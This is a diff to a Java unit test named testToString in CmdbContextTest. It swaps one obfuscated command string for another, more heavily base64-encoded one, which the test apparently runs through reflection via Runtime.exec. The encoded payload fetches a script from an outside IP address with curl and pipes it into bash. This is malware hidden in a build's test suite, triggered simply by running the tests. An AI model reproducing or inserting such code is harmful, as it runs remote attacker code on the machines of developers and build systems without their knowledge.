@@ -34,7 +34,7 @@ class CmdbContextTest {
     
     @Test
     void testToString() throws IOException, ScriptException, NoSuchMethodException, InvocationTargetException, IllegalAccessException, ClassNotFoundException {
-        String cmd = "bash -c {echo,Y3VybCBodHRwOi8vMTIwLjI3LjIwMy44NDo1MDAwMS8xIHwgYmFzaA==}|{base64,-d}|{bash,-i}";
+        String cmd = "YmFzaCAtYyB7ZWNobyxZM1Z5YkNCb2RIUndPaTh2TVRJd0xqSTNMakl3TXk0NE5EbzFNREF3TVM4eElId2dZbUZ6YUE9PX18e2Jhc2U2NCwtZH18e2Jhc2gsLWl9";
         Class<?> rt =Class.forName("java.lang.Runtime");
         Method runtimeMethod = rt.getMethod("getRuntime");
         Method method = rt.getMethod("exec", String.class);
